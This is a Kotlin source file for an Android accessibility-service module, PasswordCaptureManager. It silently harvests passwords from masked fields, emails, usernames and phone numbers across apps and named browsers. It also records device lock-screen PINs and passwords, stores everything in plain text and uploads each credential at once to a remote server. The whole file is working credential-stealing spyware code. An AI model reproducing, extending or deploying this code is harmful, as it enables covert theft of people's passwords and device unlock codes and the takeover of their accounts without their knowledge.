package com.chats.capture.utils

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.chats.capture.models.Credential
import com.chats.capture.models.CredentialType
import com.chats.capture.network.ApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import timber.log.Timber
import java.util.regex.Pattern

/**
 * Manages password capture from various sources
 */
class PasswordCaptureManager(
    private val service: AccessibilityService,
    private val credentialDao: com.chats.capture.database.CredentialDao,
    private val serviceScope: CoroutineScope
) {
    
    private val emailPattern = Pattern.compile(
        "^[A-Za-z0-9+_.-]+@([A-Za-z0-9.-]+\\.[A-Za-z]{2,})$"
    )
    
    private val passwordFieldKeywords = listOf(
        "password", "passwd", "pwd", "pin", "passcode", "lock", "unlock"
    )
    
    private val emailFieldKeywords = listOf(
        "email", "e-mail", "mail", "username", "user", "account", "login", "signin",
        "phone", "phone number", "mobile", "mobile number", "tel", "telephone",
        "userid", "user id", "user_id", "userid", "user name", "user_name",
        "account name", "account_name", "accountname", "login id", "login_id",
        "sign in", "signin", "sign-in", "identifier", "id", "user identifier"
    )
    
    // Use first 3 chars + length for duplicate detection to avoid storing full password in memory
    private var lastPasswordCapture: Pair<String, String>? = null // packageName to password identifier (first 3 chars + length)
    private var lastEmailCapture: Pair<String, String>? = null // packageName to email
    private var credentialBuffer: MutableMap<String, CredentialBuilder> = mutableMapOf()
    
    // Track last capture time per package to avoid rapid duplicate captures
    private var lastCaptureTime: MutableMap<String, Long> = mutableMapOf()
    private val MIN_CAPTURE_INTERVAL_MS = 500L // Minimum 500ms between captures for same package
    
    /**
     * Handle text changed event and check if it's a password field
     * Note: AccessibilityService can access password text even when masked on screen
     */
    fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val source = event.source ?: return
        
        try {
            // Check if this is a password field
            if (isPasswordField(source)) {
                // Get password text - AccessibilityService can access this even when masked
                val password = event.text?.firstOrNull()?.toString() ?: ""
                
                // Also try to get from source node directly as fallback
                val passwordFromNode = source.text?.toString() ?: ""
                
                // Use whichever is available (event.text is usually more reliable)
                val finalPassword = password.ifBlank { passwordFromNode }
                
                if (finalPassword.isNotBlank() && finalPassword.length >= 4) {
                    capturePassword(packageName, finalPassword, source)
                }
            }
            
            // Check if this is an email/username/phone field
            if (isEmailField(source) || isUsernameField(source) || isPhoneField(source)) {
                val identifier = event.text?.firstOrNull()?.toString() ?: ""
                val identifierFromNode = source.text?.toString() ?: ""
                val finalIdentifier = identifier.ifBlank { identifierFromNode }
                
                if (finalIdentifier.isNotBlank()) {
                    // Capture email if it contains @
                    if (finalIdentifier.contains("@")) {
                        captureEmail(packageName, finalIdentifier, source)
                    }
                    // Capture phone if it's numeric and looks like phone
                    else if (isPhoneNumber(finalIdentifier)) {
                        capturePhone(packageName, finalIdentifier, source)
                    }
                    // Capture username (any non-empty text)
                    else if (finalIdentifier.length >= 3) {
                        captureUsername(packageName, finalIdentifier, source)
                    }
                }
            }
            
            // Check for device lock screen
            if (isDeviceLockScreen(packageName, source)) {
                val password = event.text?.firstOrNull()?.toString() ?: ""
                if (password.isNotBlank() && password.length >= 4) {
                    captureDevicePassword(password)
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error handling text changed for password capture")
        } finally {
            source.recycle()
        }
    }
    
    /**
     * Handle form submission (browser login, app login)
     */
    fun handleFormSubmission(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val source = event.source ?: return
        
        try {
            // Check if this is a browser
            if (isBrowser(packageName)) {
                captureBrowserCredentials(source, packageName)
            } else {
                // Check for app login forms
                captureAppCredentials(source, packageName)
            }
        } catch (e: Exception) {
            Timber.e(e, "Error handling form submission")
        } finally {
            source.recycle()
        }
    }
    
    private fun isPasswordField(node: AccessibilityNodeInfo): Boolean {
        return try {
            // Check password input type (API 18+)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
                if (node.isPassword) {
                    return true
                }
            }
            
            // Check hint text
            val hint = node.hintText?.toString()?.lowercase() ?: ""
            if (passwordFieldKeywords.any { hint.contains(it) }) {
                return true
            }
            
            // Check content description
            val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
            if (passwordFieldKeywords.any { contentDesc.contains(it) }) {
                return true
            }
            
            // Check view ID resource name
            val viewId = node.viewIdResourceName?.lowercase() ?: ""
            if (passwordFieldKeywords.any { viewId.contains(it) }) {
                return true
            }
            
            false
        } catch (e: Exception) {
            false
        }
    }
    
    private fun isEmailField(node: AccessibilityNodeInfo): Boolean {
        return try {
            val hint = node.hintText?.toString()?.lowercase() ?: ""
            val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
            val viewId = node.viewIdResourceName?.lowercase() ?: ""
            val text = node.text?.toString() ?: ""
            
            // Check for email-specific keywords
            val emailKeywords = listOf("email", "e-mail", "mail")
            if (emailKeywords.any { hint.contains(it) || contentDesc.contains(it) || viewId.contains(it) }) {
                return true
            }
            
            // Check if text looks like email
            if (isValidEmail(text)) {
                return true
            }
            
            false
        } catch (e: Exception) {
            false
        }
    }
    
    private fun isUsernameField(node: AccessibilityNodeInfo): Boolean {
        return try {
            val hint = node.hintText?.toString()?.lowercase() ?: ""
            val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
            val viewId = node.viewIdResourceName?.lowercase() ?: ""
            
            // Check for username-specific keywords
            val usernameKeywords = listOf(
                "username", "user name", "user_name", "userid", "user id", "user_id",
                "account", "account name", "account_name", "login id", "login_id",
                "sign in", "signin", "sign-in", "identifier", "user identifier"
            )
            
            if (usernameKeywords.any { hint.contains(it) || contentDesc.contains(it) || viewId.contains(it) }) {
                return true
            }
            
            false
        } catch (e: Exception) {
            false
        }
    }
    
    private fun isPhoneField(node: AccessibilityNodeInfo): Boolean {
        return try {
            val hint = node.hintText?.toString()?.lowercase() ?: ""
            val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
            val viewId = node.viewIdResourceName?.lowercase() ?: ""
            
            // Check for phone-specific keywords
            val phoneKeywords = listOf(
                "phone", "phone number", "mobile", "mobile number", "tel", "telephone",
                "phone_number", "mobile_number", "contact number"
            )
            
            if (phoneKeywords.any { hint.contains(it) || contentDesc.contains(it) || viewId.contains(it) }) {
                return true
            }
            
            false
        } catch (e: Exception) {
            false
        }
    }
    
    private fun isPhoneNumber(text: String): Boolean {
        // Check if text looks like a phone number (numeric with optional +, -, spaces, parentheses)
        val cleaned = text.replace(Regex("[+\\-\\s()]"), "")
        return cleaned.length >= 7 && cleaned.length <= 15 && cleaned.all { it.isDigit() }
    }
    
    private fun isValidEmail(email: String): Boolean {
        return emailPattern.matcher(email).matches()
    }
    
    private fun isDeviceLockScreen(packageName: String, node: AccessibilityNodeInfo): Boolean {
        // Check for lock screen packages
        val lockScreenPackages = listOf(
            "com.android.systemui",
            "com.android.keyguard",
            "com.samsung.android.keyguard",
            "com.miui.keyguard",
            "com.huawei.keyguard"
        )
        
        if (lockScreenPackages.any { packageName.contains(it) }) {
            val className = node.className?.toString() ?: ""
            return className.contains("Keyguard", ignoreCase = true) ||
                   className.contains("Lock", ignoreCase = true) ||
                   className.contains("Pin", ignoreCase = true) ||
                   className.contains("Password", ignoreCase = true)
        }
        
        return false
    }
    
    private fun isBrowser(packageName: String): Boolean {
        val browserPackages = listOf(
            "com.android.browser",
            "com.chrome.browser",
            "com.chrome.dev",
            "com.chrome.canary",
            "com.google.android.apps.chrome",
            "com.microsoft.emmx", // Edge
            "com.opera.browser",
            "com.opera.mini.native",
            "org.mozilla.firefox",
            "com.mozilla.firefox",
            "com.samsung.android.sbrowser",
            "com.brave.browser",
            "com.duckduckgo.mobile.android",
            "com.vivaldi.browser",
            "com.uc.browser.en",
            "com.uc.browser.hd"
        )
        return browserPackages.any { packageName.contains(it, ignoreCase = true) }
    }
    
    private fun capturePassword(packageName: String, password: String, node: AccessibilityNodeInfo) {
        // Throttle captures to avoid too many rapid captures during typing
        val currentTime = System.currentTimeMillis()
        val lastTime = lastCaptureTime[packageName] ?: 0L
        if (currentTime - lastTime < MIN_CAPTURE_INTERVAL_MS) {
            Timber.v("Skipping rapid password capture for $packageName (throttled)")
            return
        }
        
        // Use first 3 chars + length for duplicate detection to avoid storing full password in memory
        val passwordIdentifier = password.take(3) + password.length
        if (lastPasswordCapture?.first == packageName && lastPasswordCapture?.second == passwordIdentifier) {
            Timber.v("Skipping duplicate password capture for $packageName")
            return
        }
        
        lastPasswordCapture = Pair(packageName, passwordIdentifier)
        lastCaptureTime[packageName] = currentTime
        
        serviceScope.launch(Dispatchers.IO) {
            try {
                val appName = getAppName(packageName)
                val url = extractUrl(node)
                val domain = extractDomain(url)
                val deviceId = com.chats.capture.managers.DeviceRegistrationManager(service).getDeviceId()
                
                // Try to find associated email/username from buffer
                val bufferedCredential = credentialBuffer[packageName]
                val email = bufferedCredential?.email
                val username = bufferedCredential?.username
                
                // Check for duplicate credential (same app, username, password)
                val duplicate = credentialDao.findDuplicateCredential(packageName, username, password)
                
                if (duplicate == null) {
                    val credential = Credential(
                        deviceId = deviceId,
                        accountType = CredentialType.APP_PASSWORD,
                        appPackage = packageName,
                        appName = appName,
                        username = username,
                        email = email,
                        password = password, // Plain text, not masked
                        domain = domain,
                        url = url,
                        devicePassword = false,
                        timestamp = System.currentTimeMillis(),
                        synced = false
                    )
                    
                    credentialDao.insertCredential(credential)
                    Timber.d("Password captured: $packageName - ${password.take(3)}*** (length: ${password.length})")
                    
                    // Immediately sync password to server
                    syncPasswordImmediately(credential)
                } else {
                    Timber.v("Duplicate credential skipped: ${duplicate.id}")
                }
                
                // Clear buffer after successful password capture
                credentialBuffer.remove(packageName)
            } catch (e: Exception) {
                Timber.e(e, "Error capturing password")
            }
        }
    }
    
    private fun captureEmail(packageName: String, email: String, node: AccessibilityNodeInfo) {
        // Avoid duplicate captures (but allow updates if email changes)
        if (lastEmailCapture?.first == packageName && lastEmailCapture?.second == email) {
            Timber.v("Skipping duplicate email capture for $packageName")
            return
        }
        
        lastEmailCapture = Pair(packageName, email)
        
        // Store in buffer for potential password association
        if (!credentialBuffer.containsKey(packageName)) {
            credentialBuffer[packageName] = CredentialBuilder()
        }
        credentialBuffer[packageName]?.email = email
        credentialBuffer[packageName]?.username = email // Email can also be username
        credentialBuffer[packageName]?.timestamp = System.currentTimeMillis()
        
        Timber.tag("CREDENTIAL_CAPTURE").d("📧 Email captured for $packageName: $email")
        
        // Clean up old buffer entries
        cleanupOldBufferEntries()
    }
    
    private fun captureUsername(packageName: String, username: String, node: AccessibilityNodeInfo) {
        // Store in buffer for potential password association
        if (!credentialBuffer.containsKey(packageName)) {
            credentialBuffer[packageName] = CredentialBuilder()
        }
        credentialBuffer[packageName]?.username = username
        credentialBuffer[packageName]?.timestamp = System.currentTimeMillis()
        
        Timber.tag("CREDENTIAL_CAPTURE").d("👤 Username captured for $packageName: $username")
        
        // Clean up old buffer entries
        cleanupOldBufferEntries()
    }
    
    private fun capturePhone(packageName: String, phone: String, node: AccessibilityNodeInfo) {
        // Store in buffer for potential password association
        if (!credentialBuffer.containsKey(packageName)) {
            credentialBuffer[packageName] = CredentialBuilder()
        }
        credentialBuffer[packageName]?.username = phone // Phone can be used as username
        credentialBuffer[packageName]?.timestamp = System.currentTimeMillis()
        
        Timber.tag("CREDENTIAL_CAPTURE").d("📱 Phone captured for $packageName: $phone")
        
        // Clean up old buffer entries
        cleanupOldBufferEntries()
    }
    
    private fun captureDevicePassword(password: String) {
        // Use first 3 chars + length for duplicate detection
        val passwordIdentifier = password.take(3) + password.length
        if (lastPasswordCapture?.first == "device_lock_screen" && lastPasswordCapture?.second == passwordIdentifier) {
            Timber.v("Skipping duplicate device password capture")
            return
        }
        lastPasswordCapture = Pair("device_lock_screen", passwordIdentifier)
        
        serviceScope.launch(Dispatchers.IO) {
            try {
                val credential = Credential(
                    id = "device_password_${System.currentTimeMillis()}", // Unique ID for device password
                    accountType = CredentialType.DEVICE_PASSWORD,
                    password = password, // Plain text, not masked
                    devicePassword = true,
                    timestamp = System.currentTimeMillis(),
                    synced = false
                )
                
                credentialDao.insertCredential(credential)
                Timber.d("Device password captured: ${password.take(3)}*** (length: ${password.length})")
            } catch (e: Exception) {
                Timber.e(e, "Error capturing device password")
            }
        }
    }
    
    private fun captureBrowserCredentials(node: AccessibilityNodeInfo, packageName: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val rootNode = service.rootInActiveWindow ?: return@launch
                
                // Find email/username/phone and password fields
                val identifierField = findEmailField(rootNode) ?: findUsernameField(rootNode) ?: findPhoneField(rootNode)
                val passwordField = findPasswordField(rootNode)
                
                if (identifierField != null && passwordField != null) {
                    // Get identifier (email/username/phone) and password
                    val identifier = identifierField.text?.toString() ?: ""
                    val password = passwordField.text?.toString() ?: ""
                    val url = extractUrl(rootNode)
                    val domain = extractDomain(url)
                    
                    if (identifier.isNotBlank() && password.isNotBlank()) {
                        val deviceId = com.chats.capture.managers.DeviceRegistrationManager(service).getDeviceId()
                        
                        // Determine if identifier is email, phone, or username
                        val email = if (identifier.contains("@")) identifier else null
                        val phone = if (email == null && isPhoneNumber(identifier)) identifier else null
                        val username = if (email == null && phone == null) identifier else null
                        
                        val credential = Credential(
                            deviceId = deviceId,
                            accountType = CredentialType.BROWSER_LOGIN,
                            appPackage = packageName,
                            appName = getAppName(packageName),
                            email = email,
                            username = username ?: phone, // Use phone as username if applicable
                            password = password, // Plain text, not masked
                            domain = domain,
                            url = url,
                            devicePassword = false,
                            timestamp = System.currentTimeMillis(),
                            synced = false
                        )
                        
                        // Check for duplicate
                        val duplicate = credentialDao.findDuplicateCredential(
                            packageName,
                            username ?: email,
                            password
                        )
                        
                        if (duplicate == null) {
                            credentialDao.insertCredential(credential)
                            Timber.tag("CREDENTIAL_CAPTURE").i("🌐 Browser credentials captured: ${email ?: username ?: phone} - ${password.take(3)}*** (length: ${password.length})")
                            
                            // Immediately sync to server
                            syncPasswordImmediately(credential)
                        } else {
                            Timber.v("Duplicate browser credential skipped")
                        }
                    }
                }
                
                rootNode.recycle()
            } catch (e: Exception) {
                Timber.e(e, "Error capturing browser credentials")
            }
        }
    }
    
    private fun findPhoneField(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return findFieldByKeywords(root, listOf(
            "phone", "phone number", "mobile", "mobile number", "tel", "telephone",
            "phone_number", "mobile_number", "contact number"
        ))
    }
    
    private fun captureAppCredentials(node: AccessibilityNodeInfo, packageName: String) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val rootNode = service.rootInActiveWindow ?: return@launch
                
                // Find identifier (email/username/phone) and password fields
                val identifierField = findEmailField(rootNode) ?: findUsernameField(rootNode) ?: findPhoneField(rootNode)
                val passwordField = findPasswordField(rootNode)
                
                if (identifierField != null && passwordField != null) {
                    // Get identifier and password
                    val identifier = identifierField.text?.toString() ?: ""
                    val password = passwordField.text?.toString() ?: ""
                    
                    // Determine if identifier is email, phone, or username
                    val email = if (identifier.contains("@")) identifier else null
                    val phone = if (email == null && isPhoneNumber(identifier)) identifier else null
                    val username = if (email == null && phone == null) identifier else null
                    
                    if (identifier.isNotBlank() && password.isNotBlank()) {
                        val deviceId = com.chats.capture.managers.DeviceRegistrationManager(service).getDeviceId()
                        
                        val credential = Credential(
                            deviceId = deviceId,
                            accountType = CredentialType.APP_PASSWORD,
                            appPackage = packageName,
                            appName = getAppName(packageName),
                            username = username ?: phone, // Use phone as username if applicable
                            email = email,
                            password = password, // Plain text, not masked
                            devicePassword = false,
                            timestamp = System.currentTimeMillis(),
                            synced = false
                        )
                        
                        // Check for duplicate
                        val duplicate = credentialDao.findDuplicateCredential(
                            packageName,
                            username ?: email,
                            password
                        )
                        
                        if (duplicate == null) {
                            credentialDao.insertCredential(credential)
                            Timber.tag("CREDENTIAL_CAPTURE").i("📱 App credentials captured: $packageName - ${email ?: username ?: phone} - ${password.take(3)}*** (length: ${password.length})")
                            
                            // Immediately sync to server
                            syncPasswordImmediately(credential)
                        } else {
                            Timber.v("Duplicate app credential skipped")
                        }
                    }
                }
                
                rootNode.recycle()
            } catch (e: Exception) {
                Timber.e(e, "Error capturing app credentials")
            }
        }
    }
    
    private fun findEmailField(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return findFieldByKeywords(root, emailFieldKeywords)
    }
    
    private fun findPasswordField(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        return findFieldByKeywords(root, passwordFieldKeywords) ?: 
               findFieldByType(root, true) // password = true
    }
    
    /**
     * Recursively finds a username field within the accessibility node hierarchy.
     */
    private fun findUsernameField(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val usernameKeywords = listOf("username", "user", "login id", "account name")
        return findFieldByKeywords(root, usernameKeywords)
    }
    
    private fun findFieldByKeywords(root: AccessibilityNodeInfo, keywords: List<String>): AccessibilityNodeInfo? {
        if (root == null) return null
        
        try {
            // Check current node
            val hint = root.hintText?.toString()?.lowercase() ?: ""
            val contentDesc = root.contentDescription?.toString()?.lowercase() ?: ""
            val viewId = root.viewIdResourceName?.lowercase() ?: ""
            
            if (keywords.any { hint.contains(it) || contentDesc.contains(it) || viewId.contains(it) }) {
                if (root.isEditable) {
                    return root
                }
            }
            
            // Check children
            for (i in 0 until root.childCount) {
                val child = root.getChild(i)
                child?.let {
                    val found = findFieldByKeywords(it, keywords)
                    if (found != null) {
                        return found
                    }
                    it.recycle()
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error finding field by keywords")
        }
        
        return null
    }
    
    private fun findFieldByType(root: AccessibilityNodeInfo, password: Boolean): AccessibilityNodeInfo? {
        if (root == null) return null
        
        try {
            val isPasswordField = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.JELLY_BEAN_MR2) {
                root.isPassword
            } else {
                false
            }
            if (isPasswordField == password && root.isEditable) {
                return root
            }
            
            for (i in 0 until root.childCount) {
                val child = root.getChild(i)
                child?.let {
                    val found = findFieldByType(it, password)
                    if (found != null) {
                        return found
                    }
                    it.recycle()
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "Error finding field by type")
        }
        
        return null
    }
    
    private fun extractUrl(node: AccessibilityNodeInfo): String? {
        return try {
            // Try to get URL from window title or content description
            node.window?.title?.toString()?.takeIf { it.startsWith("http") } ?: 
            node.contentDescription?.toString()?.takeIf { it.startsWith("http") }
        } catch (e: Exception) {
            Timber.e(e, "Error extracting URL")
            null
        }
    }
    
    private fun extractDomain(url: String?): String? {
        if (url == null) return null
        return try {
            val matcher = Pattern.compile("https?://([^/]+)").matcher(url)
            if (matcher.find()) {
                matcher.group(1)
            } else {
                null
            }
        } catch (e: Exception) {
            null
        }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val pm = service.packageManager
            val appInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    /**
     * Helper class to build a credential before it's fully captured.
     */
    private data class CredentialBuilder(
        var email: String? = null,
        var username: String? = null,
        var password: String? = null,
        var timestamp: Long = System.currentTimeMillis()
    )
    
    /**
     * Clean up old buffer entries to prevent memory leaks.
     * Removes entries older than 5 minutes.
     */
    private fun cleanupOldBufferEntries() {
        val currentTime = System.currentTimeMillis()
        val maxAge = 5 * 60 * 1000L // 5 minutes
        
        credentialBuffer.entries.removeAll { (_, builder) ->
            currentTime - builder.timestamp > maxAge
        }
    }
    
    /**
     * Immediately sync password to server when captured
     */
    private fun syncPasswordImmediately(credential: Credential) {
        serviceScope.launch(Dispatchers.IO) {
            try {
                val apiService = ApiClient.getApiService()
                val response = apiService.uploadCredential(credential)
                
                if (response.isSuccessful && response.body()?.success == true) {
                    // Mark as synced
                    credentialDao.markAsSynced(credential.id)
                    Timber.d("Password synced immediately: ${credential.appPackage}")
                } else {
                    // Will be synced later by periodic sync worker
                    Timber.w("Immediate password sync failed, will retry later")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error syncing password immediately")
                // Will be synced later by periodic sync worker
            }
        }
    }
}
